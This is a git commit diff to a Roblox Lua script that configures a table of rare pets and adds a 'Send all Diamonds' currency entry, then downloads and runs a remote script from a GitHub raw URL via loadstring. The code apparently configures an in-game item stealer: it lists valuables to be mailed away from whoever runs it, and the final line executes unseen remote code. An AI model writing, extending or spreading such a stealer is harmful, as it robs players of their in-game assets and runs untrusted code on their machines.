09c48cecdaf6de2db3048ef5ec18bcd98d4d6f98
r6dt <wycswy7h@gmail.com>
2025-02-04 19:26:53 +0700

    Update r6dt.lua

--- r6dt.lua
+++ r6dt.lua
@@ -30,5 +30,6 @@ _G.GMAIL_ITEMS = {
   ["Shiny Normal Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsShiny = true},
   ["Shiny Golden Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsGold = true, IsShiny = true},
   ["Shiny RB Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsRainbow = true, IsShiny = true},
+  ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = "50m"},
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
